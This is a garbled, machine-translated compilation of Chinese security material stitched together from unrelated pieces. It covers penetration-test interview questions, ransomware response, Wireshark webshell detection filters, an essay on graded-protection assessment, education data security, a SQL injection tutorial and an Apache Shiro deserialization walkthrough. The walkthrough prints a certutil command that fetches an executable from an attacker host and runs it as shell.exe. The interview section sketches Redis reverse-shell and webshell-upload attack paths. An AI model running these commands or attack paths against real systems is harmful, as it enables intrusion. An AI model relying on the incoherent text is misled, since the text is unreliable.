TCP and UDP protocols distinguish tcp from connectivity-oriented, udp-oriented messages, tcp has many requirements for system resources, udp structure simplicity, tcp guarantees data integrity and order, and udp does not guarantee the establishment process of https.

The Client sends a request to the server side.

The server-side returns the certificate and the public key, which exists as part of the certificate.

The client verifies the validity of the certificate and the open key and, if valid, the shared key is generated and sent to the server side using the open key encryption.

The server side decrypts data using a private key and encrypts data using the received shared key, sent to the client.

The client decrypts the data using a shared key.

The SSL encryption is established.

Flow analysis wireshark simple filtering rules filtering ip.

From simple to difficult questions, not only can test the knowledge foundation of the interns, but also can test their learning ability, there is the scene open answer, online can find a little information, but also need to think about themselves, combined with the actual work to answer.

Good words not to say, from simple to difficult to serve questions, and reference answer, I hope I found in my work experience can help you.

An emergency repair patch for this vulnerability has been released and can be protected in the following four ways.

Upgrade the native JDK version Because Weblogic uses the default version 1.6 JDK file in its installation file and is a JDK version with a deserialization vulnerability, upgrading to JDK7u21 above can avoid remote code execution due to the Java native class deserialization vulnerability.

Delete an unsafe file Delete the wls9_async_response.The war is with wls-wsat.The war files and related folders, and restart the Weblogic service.

It belongs to a primary application package, where its removal or name change may have unknown consequences, and it is not officially recommended by Oracle.

If there is a problem with the application deleting this package directly, technical support from Oracle Products.

Review the impact assessment and back up this file.

You can also monitor key commands such as ifconfig whoami ipconfig, which are commands that basically execute when you get webshell.

Batch check what tools http service use and omit use step by step method.

First of all, it is certainly unrealistic to propose 50w ip full ports for two weeks, so to consider explaining to the customer, it is necessary to adjust the scan task, arrange as many scan resources as possible, such as scanning the machine, scanning the network bandwidth, etc.

Referring to the average time of 100 IP ports, the scan time is estimated to reply for about 30 days, and leave a week for follow-up scanning, and document sorting to multi-threaded distributed and high concurrency. masscan + nmap masscan was used to survive first and eliminate the unsurviving IP.

Using a distributed nmap high concurrent port, massacn ports can also scan once, to probe at nmap to improve the scan speed.

Due to the excessive number of IP, can not directly throw all the IP up to sweep, the time is certainly not enough.

You can discuss with the customer to reduce the number of IP and filter the unsurviving IP.

Accelerating scanning requires parameter fine-tuning, such as- -min-hostgroup, --min-rate and- -min-parallelism for the presence of a firewall, can propose the need to provide a scanner, the best in-wall sweep data collation

For a large number of list and json use python-nmap python-masscan.

Conditional competition vulnerability principle and example conditional competition vulnerability is a server-side vulnerability. Since the server side is concurrent when processing requests from different users, such problems will lead if the concurrent processing is improper or the logical order of relevant operation design is unreasonable.

For example, many web programs will have the function to upload files, heads and images, etc. The server will definitely check whether the file meets the conditions, do not meet to be deleted, then the problem is that if we adopt a large number of concurrent requests, we pass an image that generates malicious webshell, and accessing it can generate webshell.

Upon upload completion and security check completion and removing its clearance, the attacker accessed the file by constantly initiating an access request, the file is executed and a malicious s h e l l file is generated on the server.

So far, the task of the file has been completed, as for the problem of finding it is an unsafe file and removing it is not important, because the attacker has successfully implanted a shell file in the server, everything that followed is not a problem.

Turn on the system firewall.

Use the system firewall advanced settings to block connections to port 445 (which affects services using port 445).

Open the system for automatic updates, and detect the updates for installation.

Stop using operating systems where Microsoft no longer provides security updates.

If you do not need to close the service by using a shared service.

Terminal emergency solutions for endpoint security are deployed.

If the user has deployed terminal management products, it can patch through the terminal management software.

Turn off the instack traffic through the host firewall.

The host firewall is turned off to 445 outstack traffic.

Open the file audit, and only allow the word.exe，explorer.File access by exe et al.

Has infected with emergency solutions.

Disconnect the network to prevent further diffusion.

Give priority to checking the vulnerability status of the uninfected host, and restore the network connection before strengthening the vulnerability.

The infected terminal determines the disposal method according to the terminal data type. If the system is reinstalled, it is recommended to fully format the hard disk, use the new operating system, improve the operating system patch, and then restore the network connection after confirming that there is no relevant loopholes through inspection.

The computer turns on the system backup, and adds protection.

If key files have been backed up in advance, data backup recovery can be done if the virus is cleared.

If the shadow backup is not deleted by the ransomware, you can restore the system to the point in time for the uninfected ransomware virus.

Complex passwords of a length greater than 10 bits are used.

Disable the GUEST guest users.

Try not to use LAN sharing, or set the shared disk to read-only properties, and do not allow LAN users to overwrite files.

Try to close off the unnecessary ports, such as: 445,135,139,3389,5900.

Don't click on messages from unknown sources as well as attachments, phishing messages are an important source of ransomware transmission.

The first step to dig the XSS is to find the input, that is, the user can control the location of the code, the second step is to find the output, that is, to find the first step where the code input by the user is output in the web page, the third step is to construct the payload, by viewing the source code, to build the payload.

Due to business needs, some websites often need to provide file view or file download function, but if the user view or download files are not limited, then malicious users can view or download any sensitive files, this is the file view and download vulnerability.

Function read file of the path user controllable and not checked or checked lax output file content any file download and any file read have similar places.

The file path is saved to the database to let the user submit the file for the ID or session download file.

Users need to make a permission judgment before downloading the file.

The file is placed in a directory that the web cannot access directly.

The Directory traversal service is not allowed.

How to prevent DDoS is divided into many kinds, for different types have different ways for low network layer of DDoS attacks have some effective protection means, such as discarding the first SYN package, traffic protection equipment, WAF blocking address is the seventh layer, the eighth layer of CC attack, it will find the key location on the target site to consume resources, repeated attacks to consume CPU / memory / database IO and other resources.

SMS verification code is displayed in the verification code request.

Registered mobile phone number and SMS verification code were not matched verified.

The user name, mobile phone number, SMS verification code were not matched verified.

The verification of the SMS verification code is verified in the local client.

The reset step is not checked.

Reset request is not authenticated

Log in to successfully modify the password function in parallel to overreach

The increase of database queries in a short time may encounter scanning or sql injection test, which can be combined with traffic analysis tools.

select and union feature database query statements, which can monitor both keywords when the two numbers appear frequently and may have a SQL injection vulnerability or are being scanning by the scanner, but require further viewing of the specific request parameters.

For the captured data package, the HTTP protocol package was filtered out, and the IP with large flow in a short time was filtered out in the statistics office.

Try to locate some basic injection features.

Filter out that you can attack the IP, analyze the flow packet HTTP flow, and you can be positioned.

Assuming that the web application server found an abnormal increase in files, initially suspected that being uploaded to webshell, to describe the idea of traffic analysis traceability.

Check out keywords like eval, z0, shell, whoami and see when appearing too often, you may need to see which page initiated the request, and it may be webshell

Quick search for keywords through the WireShark tool to locate to an abnormal traffic pack.

Find out the exception IP and what you uploaded to see how to attack I P for webshell.

First, view the direction of the traffic through selection, statistics, and dialogue, and locate the suspicious IP address.

Try targeting the IP address according to the uploaded webshell ip.addr == ip && http matches “upload||eval|select|xp_cmdshell”&& http.request.method == “POST” 。

Try to trace the vulnerability location after finding the Webshell, and locate it to the initial webshell execution or upload.

Positioning the vulnerability type according to the initial HTTP upload package or other vulnerability specialties.

Assuming that the server is on port 21,80,445,3306,11211, what penetration ideas do you have.

And an attack attempt using MS12-073.

Port 80 corresponds to the web service, which can be analyzed by information collection, middleware type and version, back-end language type.

There are also CMS types to see if known vulnerabilities are available.

If not, penetrate the Web site to see if there are vulnerabilities such as injection.

Port 445 corresponds to the network shared SMB service and can try to attack the server using overflow vulnerabilities such as ms08-067,ms17-010.

You can also try using IPC$ for attack 4) blasting also for 3306 mysql ports.

After successful, you can write webshell, with mysql or construct VBS write server startup, with server restart can add administrator account and open port 3389.

Port 11211 is the port of the memcached service.

memcache defaults to an unauthorized access vulnerability, and telnet ip gets server-sensitive information.

If the server has port 22,8080,8161,6379, what do you think.

22 Port general S S H remote landing protocol of LINUX server generally adopts blasting method.

The 8161 is running the Apache ActiveMQ.

Its Console has a default port and a default password / unauthorized access.

When the ActiveMQ opens the PUT request, constructing the Payload,Response returns the corresponding physical path information.

ActiveMQ turns on the PUT method by default and we can upload jspwebshell. when fileserver exists

In addition to supporting the P U T protocol, ActiveMQ also supports the MOVE protocol, which can cause any file movement vulnerability.

It also has loopholes such as CVE-2015-5254 deserialization.

6379 is an open port for the redis database.

Redis can cause unauthorized access due to improper configuration.

Connect redis, to write webshell, write crontab schedule task rebound shell, and write ssh public key to obtain operating system permissions.

Its ports can also be cracked by violence.

Due to the relatively large volume of business, it will be scanned after work at night.

The first day scan 9 PM due to unexplained A professional company system can not access, by professional company A asked, the next day the reason found that because all the traffic is through the VPN to the host, resulting in import and export VPN gateway blocked, business cannot access to normal, by professional company A asked how to emergency situation?

Determine the reason and explain how to carry out the subsequent scanning task?

Check the emergency processing and customer communication, first mediate customer emotions, communicate with customers, immediately stop the scan to restore the normal business system, and inform Company A to investigate the reasons, and check the network and host situation.
Secondly, investigate the network knowledge. Since the traffic will be blocked through the VPN, find a way to bypass the VPN or speed down, here is required to provide the Intranet scanning machine to scan, but need to absorb the last experience before the scan test, such as detection scan at rest at noon, pressure measurement.

Then in the night, scan company needs to send network management personnel to help check whether the system condition is normal.

The results were sent to Company A after the scan task, and Company A wondered about one type of vulnerability.

In principle, the division of responsibilities is not allowed to directly operate the customer company's machine, and the customer machine authority. We are responsible for explaining the loopholes, and actively providing rectification suggestions, and can not operate the customer machine directly or indirectly.

Secondly, test the way customers want us to fix the vulnerability directly, this situation will often appear in our daily work, we want to explain the scope of responsibility: we are only responsible for explaining the vulnerability description and principle and repair suggestions, they are responsible for rectification.We are not familiar with the system business, and we can not bear the risks and problems.

After the security task, the results were returned to A Company. After inspection, A Company found that a vulnerability did not appear in the result and was missed.

After inspection, it was found that we did not scan it at that time. How to explain and deal with the customer?

To investigate the communication ability, first of all to appease the customer emotions, directly give the conclusion is not appropriate, you can first say that we check and then feedback, and then scan the vulnerability and then analysis, the next is to find reasonable reasons to withstand the appropriate round field to confirm whether the vulnerability exists.

If there is a loophole that we did not sweep out, we need to check whether the assets survived at that time, whether they were closed and opened, whether because the network was not good at that time, the bandwidth was not large enough, the network fluctuations were large, the external network environment was unstable, WAF interception, etc

Hold the customer mood first and convince them that we are capable, only occasionally because of uncontrollable factors.

Then provide remedial solution, repair and other follow-up solution if the vulnerability can not be swept out to change the scanner, more difference, if still sweep out, we should consider the optimization scheme, see whether to establish a special test to separate batch investigation of this vulnerability.

If it is really our problem and we can't find a reason to justify it, we will honestly admit that we will talk to the customer manager, propose deficiencies and improvement plans, and consider how to give the customer a satisfactory account to ensure that there is no such problem statement next time.

The main problems existing in Party A of Party A's evaluation projects in recent years are mainly distributed in the government, public institutions, human security, land, finance, health and transportation, private enterprises are also available, but not many, generally financial private enterprises.

From the point of view of all walks of life, the unit enterprises based on network security is the original intention, and most of the unit enterprises are policy requirements.

The power industry and the financial industry both have documents to carry out equal insurance, so in many private enterprises are not willing to do it, but they must need to do equal insurance.

Some government units are fooled by the insurance institutions to think that the insurance can give themselves an "insurance", purely to find other insurance institutions to their own blame.

The information person in charge of some units also want to achieve a community of interests through project procurement.

Technical ability is not strong, heavy equipment light management, many party a unit without network security management, is basically responsible for the network or responsible for server personnel, and in addition to banking, securities, most of the unit technical level is not high, many are through outsourcing or integrators for operation, this causes the evaluation process, even do not know all equipment management account and password, because outsourcing personnel and integrators generally only give a management account or generally not to audit administrator account, network and security awareness training almost no.

A one-sided understanding of network security, some unit technical personnel think that network security is penetration, excessive touting penetration ability, despise evaluation, that evaluation is going through the motions, which is also part of the reason for the evaluation institutions.


Most of the evaluation institutions in second-and third-tier cities are local leaders. In addition to the evaluation, there are basically other risk assessment and software testing businesses. Therefore, they are relatively famous in local provinces and neighboring provinces, and some even do their business in neighboring provinces.

Second and third-tier cities and new evaluation institutions are basically at the edge will be eliminated at any time, before a evaluation institutions in jiangsu don't know even ability verification also don't participate in, evaluation report is basically, do not conform to, this kind of many predecessors are integration company, low technical strength, guarantee assessment as driving training, every year most was stopped business is this kind.

Most non-state prefix or state-owned enterprise background evaluation institutions in the face of increasingly fierce market competition, Pressure is increasing, Especially the reason of the epidemic this year, Many institutions were unable to carry out evaluation in the first and second quarter, The author is also the top three institutions in a central province, But it only gradually resumed business until June, If non-national evaluation institutions without business means closure, After all, the daily taxes and labor costs are under great pressure, Plus, in the past two years, Lower entry threshold, A number of new evaluation institutions were added, And relaxed the conditions for remote evaluation, Competitive pressure is even greater, therefore, Malicious low-price grab target events emerge in an endless stream, Some institutions are even have 3W a system, The reduction of the evaluation cost ultimately leads to the short evaluation time and the low technical level of the evaluation personnel, Price pressure between the evaluation institutions, after all, Survival is the first thing.

At present, the pre-tax salary of appraisers in first-tier cities is basically about 7000-9000, Second, second and third-tier cities are about 5000-6000, tell the truth, This is for a practitioner in the cybersecurity industry, Really lower, This still has the relevant work experience, In a central province where I am located, The salary of system integration, manufacturer technical support, software testing and other positions is at least 6,000 or above, Development of the work is generally 1W, And the evaluation personnel project pressure is big, Frequent trips, High documentation requirements and high technical capability requirements, This salary is hard to attract good people, Many people who invite the interview are not cold in the evaluation, In addition to the salary treatment is not high, Not interviewing at all, Or without greeting after making an interview, Or ask to go back and consider it after passing the interview, The consideration are not considered, I feel that recruitment is particularly difficult this year, And many people in the service began to fluctuate because their wages were not paid during the epidemic, one side, Low cost of evaluation items is gradually reduced, on the other hand, The cost of the evaluation institutions is gradually increasing, To reduce costs, you have to do more projects, Reduce the marginal costs, The formation of a conflict is inevitable.
Evaluation institutions lack of long-term development planning currently evaluation institutions are mostly state-owned enterprises, some state-owned enterprises background is also conceited, may belong to public institutions, but the author in the central province region, evaluation institutions are private enterprises, shareholders and management lack of long-term planning, feel like cutting leek, especially blindly expand business, but personnel technical ability and management level has not improved, enterprises often pay more attention to big, it is difficult to do strong, lack of clear development planning, individuals can not see the development prospects.

Evaluation institutions independence insufficient evaluation institutions for profit determines the evaluation institutions cannot be completely neutral, so many places are used to spend money to buy reports, and the evaluation management method to evaluation institutions punishment is relatively small, even if the revocation of recommendation certificate, the original team to change a company can start from scratch.

In addition, the higher and higher customer requirements are increasing, the evaluation institutions will inevitably tend to the customers. After all, for the vast majority of institutions, the customer is God.

More in the process of standard formulation, influenced by safety product manufacturers, the author roughly looked, most of the domestic industry 10 manufacturers basic participate in the standard, specific manufacturer name is not mention, the author thinks that the standard should be mainly formulated by the standard committee, at least the standard committee is no interest tendency, if manufacturers participate in, it is inevitable that more or less will tend to their own products.

This is why after the introduction of insurance 2.0, many manufacturers have released some basic version package, standard version package and luxury version package and other articles, so that many customer units are slowly considered that the insurance assessment is to spend money to buy equipment, and the original intention of the national insurance assessment is not very understood.

Standard development level is 1.0 poor, basic requirements, such as light log audit exist 3, security area boundary, security computing environment and security management center for the log audit requirements, the regional boundary and security computing environment is almost exactly the same, the author as the evaluation industry "old man", also didn't understand what the repeated evaluation, let alone how to understand.

In addition, the integrity of the data, data confidentiality, etc.

Evaluation requirements, many evaluation index corresponding evaluation object obviously not evaluation, such as the remaining information protection evaluation object is terminal and server equipment in operating system, business application system, database management system, middleware and system management software, operating system are clear on Windows, but on Linux, but database management system, middleware, business application system, but not detailed description, evaluation requirements evaluation implementation are semantic description, lack of operability and practice, resulting in the evaluation implementation methods are different.

At present, many customer units are also learning about the insurance 2.0 series of standards, but many standard evaluation institutions can not explain, how to explain to customers.

In the future, there are a lot of ridicule. The author believes that the future development of grade evaluation is still relatively market prospects and policy prospects, after all, China is too big gap between the United States and other cyber security powers in terms of cyber security protection, especially in theoretical research.

Under the requirements of blindly pursuing low-cost evaluation and higher and higher customers, the grade evaluation industry may usher in a round of reshuffle in the next three years, hoping to truly make the grade evaluation work solid, which requires the participation of many evaluation institutions, network security and scientific research institutions, and can export the grade evaluation system abroad like ISO27000.

The network operators shall, in accordance with the requirements of the network security level protection system, fulfill the following security protection obligations, protect the network from interference, damage or unauthorized access, and prevent the network data leakage or theft or tampering.

Formulate the internal security management system and operating procedures, determine the head of network security, and implement the responsibility of network security protection.

Take technical measures to prevent computer viruses, network attacks, cyber attacks, network intrusion and other behaviors that endanger network security

Take technical measures to monitor and record the network operation status and network security events, and keep the relevant network logs for at no less than six months in accordance with the regulations.

Take measures such as data classification, important data backup, and encryption

Other obligations stipulated by laws and administrative regulations.

It is clear that the law stipulates that the network security level protection, but also called the information security level protection is unprofessional.

Trusted verification can be based on the system guide programs, system programs, important configuration parameters and communication applications, and conduct dynamic credible verification in the key execution link of the application, alarm after its credibility is detected, and send the verification results into audit records to the Security management Center.

The focus of the entry is on two-way authentication, the server verifies the client identity, and the client also needs to verify the server identity.

Domestic corresponding TCM chip module, at present, only a few domestic equipment manufacturers have.

Results also need to be sent to the Security Management Center.

There is another old way to realize the entry is the unified authentication center, that is, all the users in the access network need to conduct unified authentication, a bit like the unified identity authentication of the university, all need to enter the school number, password, etc., to access other websites and resources of the school.

The system administrator should be identified, allowing it only to perform and audit the system management operations through specific commands or operations interfaces.

The resources and operation of the system shall be configured, controlled and managed through the system administrator, including user identity, system resource configuration, system loading and startup, abnormal handling of system operation, backup and recovery of data and equipment, etc.

The audit administrator shall be identified and is only allowed to conduct security audit operations through specific commands or operations interfaces.

The audit records shall be analyzed by the audit administrator and processed according to the analysis results, including the storage, management and query of the audit records according to the security audit strategy.

The security administrator should be identified, allowed only to perform and audit security management operations through specific commands or operations interfaces.
The security policies in the system should be configured through the security administrator, including the setting of security parameters, uniformly security mark the subject and object, authorize the subject, and configure credible authentication policies, etc.

Specific management areas shall be divided to control the security equipment or security components distributed in the network.

A secure information transfer path should be established to manage security devices or security components in the network.

The operation status of network links, security equipment, network equipment and servers shall be centrally monitored.

The audit data scattered on each equipment shall be collected and summarized for centralized analysis, and shall ensure that the retention time of the audit records meets the requirements of laws and regulations.

Security policies, malicious code, patch upgrade and other security-related issues should be centrally managed.

It shall be able to identify, alarm, and analyze various security events occurring in the network.

Spam should be detected and protected at key network nodes and upgrades and updates of spam protection mechanisms maintained.

Mobile terminal shall accept the equipment lifecycle management, equipment remote control of the mobile terminal management service side, such as: remote lock, remote erase, etc.

It should have the function of selecting the application software installation and operation.

Only the application software installation and operation of the specified certificate signature should be allowed.

It shall have the software whitelist function, and shall be able to control the installation and operation of the application software according to the whitelist.

Some implementation of terminal control requirements: WIFI connection certificate, which requires a local certificate to connect to WIFI.

The PC also has the certificate requirements.

PC control or enhanced software such as Symantec Terminal Management, leukocytes.

Qualification score and assessment cycle change of network security level protection 2.0.

Basis: According to the BOSS speech of a national insurance office, the score of the new insurance assessment is 75.

There is no formal document for you only as a reference.

The new generation of information technologies, such as the mobile Internet, big data and cloud computing, have further integrated traditional education with emerging technologies.

The COVID-19 outbreak in early 2020 has had an impact on the normal operation of the education industry, and the online education model combined with big data technology has played an important role in the process.

However, in the application of new technology, big data platform operators face network security challenges, such as big data security management and data protection, and network security protection in the cloud computing environment.

This paper analyzes the network security problems existing in education big data and puts forward suggestions, looking forward to jointly improving the network security protection ability together with the big data platform operators in the field of education.

Big data technology has been widely applied in the field of education, and its importance is gradually highlighted. However, at present, its data is not safe. The following only explains the existing data security problems from three aspects.

After the 2016 college entrance examination, criminals illegally obtained more than 50,000 personal information of candidates in Shandong Province in 2016. A candidate was cheated of 9,900 yuan to university because of personal information leakage, but later lost his life due to depression.

In March 2017, a hacker exploited vulnerabilities in the U. S. Job Link system to obtain personal information from 4.8 million job seekers.

In 2019, a database at a university in China leaked 8.4TB of email metadata due to configure public access rights correctly

In August 2019, more than 50 students from a university leaked their personal information and was used by an enterprise to achieve the purpose of tax evasion in the form of false wages to college students.

In January 2020, a college student in Wuhan went home. After the outbreak of COVID-19, more than 1,000 Wuhan personal information forms, including the student, were transferred to the city's WeChat group, including home address, family information, SFZ number, etc. The student was harassed by strangers due to harassment and abuse from strangers.

These cases show that the disclosure of personal information in the field of education will cause serious consequences. Some enterprises use them to illegally avoid taxes, release business secrets, some students' family life is affected, and more students lose their lives.

The problem of insufficient personal information protection and insufficient awareness still exist, and the education big data platform should further strengthen the work of personal information protection.

Big data platform can obtain students' basic information, family information, learning information, love and social information and other sensitive data through account registration, collection, retrieval and audit, love and social information, network crawler and other technologies.

After investigation, an online learning APP launched course subscription and data procurement services, which required real-name identity authentication. The basic personal information, financial payment information and logistics receipt information must be collected.

In addition, several APP models also collect mobile phone number and email information to varying degrees, and some individuals need to collect SFZ number for real-name authentication.

There are no source audit or white box review methods to determine whether the application can access address books, chat records, personal browsing records, but there is no doubt that these are sensitive personal information.

However, there are still many practical problems and security blind spots for data security management for so many kinds of educational big data.
There are excessive collection problems during the data collection process.

In the process of data processing and use, data security protection is not effectively implemented through equal emphasis on technology and management. For example, some recruitment platforms will publish the SFZ number, birth date and mobile phone number together when announcing the candidates' scores.

Education of big data platform operators lack of data security management ability

Platform operators, teacher users, and student users have no strong awareness of information protection.

Big data Relying on cloud computing resources is a widely adopted service mode. The cloud environment makes the security threat facing educational data more complex.

External threats emerge in an endless stream, cloud platforms and tenants can become intrusion objects and various types of threats, such as denial of service attacks, port scanning, Trojan backdoor, powerful attacks, buffer overflow attacks, IP fragmentation attacks, worms and more.

The cloud platform has problems with virtual machine abuse, tenant isolation failure, data leakage, tampering or loss, application interface security, and code-level security.

In the cloud service mode, the division of unclear security responsibilities, business permissions are not transparent, difficult to conduct data audit and accountability, and other problems, cloud platforms and tenants should always maintain the awareness of "education of big data on the cloud cannot achieve absolute security".

In view of the above prominent problems, the China Software Evaluation Center has comprehensive practical experience and gives practical suggestions.

Technical management, personal information protection do a good job in the education of big data personal information protection, education big data platform and application developers should be in-depth analysis of big data platform based on open source software, on-demand architecture, for such application should focus on security, and network security risk assessment, big data platform application, interface, APP should conduct source code security review and penetration test, fill loopholes to prevent information leakage

At the management level, we should improve the data governance capacity, and do a good job in multi-source data collection and sensitive data desensitization, so as to prevent security problems such as leakage and abuse in the process of data opening up and sharing.

In terms of data security management, education big data platform to continue to strengthen the data security management ability.

In May 2019, the Internet Office of China Information issued the data security management measures, the management method for data collection, data processing, data security supervision and other requirements, such as the implementation of data security technology protection, carry out data security risk assessment, formulate network security emergency plan, timely disposal of security events, organize data security education and training.

Data security management and prevent personal information disclosure is closely related but different two tasks, since it is a "big data" platform, so certainly inevitable to collect large amounts of education data, so improve data security management ability is particularly important, relevant institutions should meet the requirements of big data service security ability, improve the overall data security ability maturity.

defense in depth, The cloud environment makes the security threat faced by education data more complex, Educational big data will be stored and applied in a wider range of mobile terminals, network devices, computing devices, application systems, and business objects, Therefore, we need to have a deep defense thought, Operators of the big data platform in the education industry shall comply with the provisions of the Network Security Law and the Basic Requirements for Network Security Level Protection of Information Security Technology (GB/T 22239-2019), We will strictly implement the basic requirements for national cyber security, At the same time, education is in the scope of key information infrastructure, Safety protection and management should be strengthened.

As the main force of network security, the evaluation of big data security operators need to education the whole process of security consulting, testing, evaluation, certification, training, maintain the sensitivity to data and risk, continue to provide network security situation perception, advanced continuous threat (APT) detection, IDC vulnerability mining in education industry, big penetration testing of professional data platform.

The Network Security Center of China Software Evaluation Center is committed to the network security protection and security operation of the information system, and supporting the competent government departments to perform the social management and public service functions related to the network security.

What is SQL injection SQL injection means that the web application does not judge or filter the legality of the user input data. The attacker can add additional S Q L statement to the end of the predefined query statement in the web application, realize illegal operation without the knowledge of the administrator, so as to deceive the database server to perform unauthorized arbitrary query, and further obtain the corresponding data information.

The classified SQL injection of SQL injection is divided into many kinds, including joint injection, injection of Boolean injection, error reporting injection, time injection, stack injection, secondary injection, wide byte injection, cookie injection, etc.

Of course, these injections all produce the same principle, as mentioned above.

In the following article, the author will also write out all these injection combination examples.

The precompiled statement was created by already sending the specified SQL statement to DBMS, completing parsing, checking, compilation, etc, so the attacker cannot change the structure of the SQL statement.

Of course, there are some operations through pre-compilation to bypass some security protection, you are interested to go in searching.

Strictly control data types in strong type languages such as java, c is generally no digital type injection, because when accepting the user input id, the code generally does a int id data type conversion, if we enter a string, then in this case, the program will report an error.

But in PHP, ASP languages that do not emphasize processing data types, the code we see receiving id is as follows.

Escape digital type injection of special characters can be prevented by checking the data type, but the character type can not, so what to do, the best way is to escape the special characters.

For example, in MySQL, we can make sense of "\ '", which prevents some malicious attackers from closing the statement.

Of course, we can also escape special characters through some security functions.

The injection of Boolean type means that the result returned by the page is Boolean type. By constructing the SQL judgment statement, check whether the return result of the page is wrong, and whether the page return is normal to determine which SQL judgment conditions are established, so as to obtain the data in the database.

Here we can open the eighth level of our sqli-labs, the source code of this target site has been sent in the previous penetration test outside the network preparation article, and if you don't know, you can see it again.

Here, for example, stand in front of you someone, you ask him what the name is, but he is a dumb can not speak, can only nod and shake his head, how should you get the name at this time.

Yes, of course we went to ask him, and then he told us right or not by nodding or shaking his head.

Assuming the person's name is Zhang San, I asked him, your name Li.

He shook me a head, this time I know his no surname Li, I continue to ask, until we have his last name Zhang, he gave me a head, this time I know.

Of course, this inquiry is very heavy, and the same is true in our boolean injection, so we will all write the boolean injection with some automatic injection tools to help us complete the injection.

We also need to know some built-in functions of some M y S Q L before performing the boolean injection.

Of course, some masters with weak code skills can also use sqlmap to help to inject work.

As the name implies, the error injection is to construct the wrong information published on the page to obtain the data we want. The injection described in this chapter, the database is MySQL.

The first reason for the error reporting injection is that the application system did not close the database error reporting function. For some errors in SQL statements, it is directly displayed on the page, and some parts even directly leaked the database name and table name.

Secondly, it is essential that the corresponding MySQL error reporting function is not filtered in the background.

This function is used to connect the strings.

Since the updatexml() function xpath path needs to connect special characters, the connected special characters need to be 16 decimal encoded concat_ws() function.

When we provide a seed parameter 0, look again: see the same value each time.

It can also be called pseudorchastic.

Check out the multiple data.

The first data was found to match the single data just viewed, and the other data were exactly the same.

Previously we learned that rand() is a random number between 0 and 1, then multiplication 2 is naturally the random number between 0 and 2, and cooperating with floor() can produce the determined two numbers.

It can be observed that the repetitive data was integrated here and then counted.

The point is, what happens in the middle.

After an online query, it is found that mysql builds a virtual table when it encounters the statement.

The virtual table has two fields, one is grouped and one is the count value.

Then when querying the data, first see if the group exists in the virtual table, if the count value plus 1, does not exist, create the new group.

The particularity of the rand() is analyzed because of the particularity of the rand function.

It means here that the group by is grouping, executed once, and if the grouping is not present in the virtual table, it is calculated again when the new grouping is inserted.

In this way, all the theoretical details are all clear.

Remember our previous questions, why use the two numbers of 0 and 1?

When group by groups it, the first value 0 is first encountered and found that 0 does not exist, so the grouping needs to be inserted, and at this time is again triggered to generate the second value 1, so the second value 1 is finally inserted into the virtual table.

A third value of 1 is then encountered, and because grouping 1 already exists, plus 1 is counted directly.

When the fourth value of 0 is encountered, 0 is found not present, so a new packet needs to be inserted and then triggered to generate a fifth value of 1, so that packet 1 is inserted into the virtual table, but, packet 1 already exists, so the error is reported.

To sum up, it can be seen that the role is to produce the predicted digital sequence, and then reuse the particularity of the virtual table, which eventually led to false reporting.

The next chapters are all analyzing SQL injection from examples.

First, we first analyze the S Q L injection of the l o w level of the DVWA target range.

Here's a user id we need to fill out, then we fill out a 1 and see what will happen.

Here is the information of user id number 1, remember the aforementioned method to verify the SQL injection, add a single quotation mark after 1, then let's enter 1 in a try.

We can see that we input 1 and cause the SQL statement to be resolved normally and eventually cause the program error. We initially judge that there is an injection point, so we can look at the source code to analyze the analysis.

You can see the SQL statement here and then see the post text code without any filtering of our id parameters, here meets our injection requirements with controllable variable id and no filtering, the statements are taken into the database for query.

Knowing that there is an SQL injection here, then how can we use it.

Stack injection from the noun meaning see should be a bunch of sql statements executed together.

The same is true in real applications, and we know that in mysql, mainly in the command line, each statement ends at the end of a semicolon indicating the end of the statement.

So we think about whether we can use more sentences together.

This one is called the stacked injection.

To put it bluntly is to stack a stack of sql statements together, using the semicolon to end the last statement and then stack the other statements together.

Principle of stacking injection In SQL, the semicolon is used to represent the end of a sql statement.

Imagine if we continue to construct the next statement after a sql statement with a semicolon, will we execute together?So the idea creates a stack injection.

And unioninjection(joint injection) is there the difference between two statements?

The difference is that the statement types executed by union or unionall are finite and can be used to execute query statements, while the stack injection can execute arbitrary statements.

But what's why nothing appears here?

This is because the stack injection does not show the second statement execution result even if the first query result is empty and the second statement is not report even if the second statement fails.

So how can we verify our stack injection.

The csrf_token for getting the login page uses the request library and the BeautifulSoup module for session maintenance and csrf_token climbing.

Read the password dictionary and use the with loop.

This article is to record my own learning situation, and also to give other beginners a little python ideas.

Shiro is a powerful and easy-to-use security framework for authentication, licensing, password, and session management, and ease of use is the ultimate goal of the project.

Application security is very confusing and frustrating, and is considered an "inevitable disaster here."

If you make it simplified to where a novice can use it, it will no longer be a pain.

There is no other security framework with the same width range as Apache Shiro, and it can be your "one-stop" to guarantee your security needs.

The Apache Shiro can work in any application environment.

Although it may not be required in network work, EJB, and IoC environments.

But Shiro's authorization also has no specifications, or even many dependencies.

Apache Shiro has exciting web application support that allows you to create flexible security policies and network protocols based on your application-based url, while also providing a set of JSP library control page output.

Shiro's clean API and design mode make it easy to integrate with many other frameworks and applications.

You will see Shiro seamlessly integrating frameworks like Spring, and Grails,Wicket,Tapestry,Mule,Apache Camel,Vaadin, etc.

Apache Shiro is a part of the Apache Software Foundation.

Both the project development and user groups have friendly Internet users willing to help.

Such commercial companies also provide professional support and services if they need Katasoft.

Shiro vulnerability principle under the framework, the user login successfully generates an encrypted one.

Its value is, and the value is obtained after serialization, encryption, and encoding.

When the service side receives a Cookie, the process parses: the retrieved value is decoded and decoded for deserserialization. No filtering is performed during the call deserserialization in step 4, which can cause a departure remote code execution vulnerability.

Script needs to be called, the file here is not the original, adds the time-lapse command function, so don't use the original, or it cannot be detected.

The interceptor is an anonymous interceptor that can be accessed without landing, and is generally used for static resources.

For the landing interceptor, a landing is required to allow access to it.
Users can write a matching URL configuration that will intercept the matching URL and execute the response interceptor.

Thus enabling access control to the URL, the URL path expression is usually in ANT format.

That is, there is no need to login, and login authentication.

Then assuming that the configuration is changed to:, you can match to but not to (more inclined bars), then it will be released.

Then go into the interceptor and both paths for Spring, agree, causing permission to bypass.

Select the rebound to try, here started first, according to the command format, enter the download file, but was not successful.

See a line of code below to test valid directly at the installed host.

certutil.exe -urlcache -split -f http://192.168.112.149:8010/Shiro1.exe shell.exe & shell.The success of exe CS shows that the tool has a little bug test option in command execution, which is also a little problem.

Script needs to be called, the file here is not the original, adds the time-lapse command function, so don't use the original, or it cannot be detected.

If the operating system type is unknown, you can choose any one and run it again if you are wrong.

Execute, and remotely open the one on the target host.

That is, after obtaining the key, you can execute the attack command by building the malicious access permission and get the permission.

The solution is to upgrade version to the above.

For recent permission bypass vulnerabilities, avoid using wildcards as a URL path expression for a dynamic routing blocker or upgrade to above.
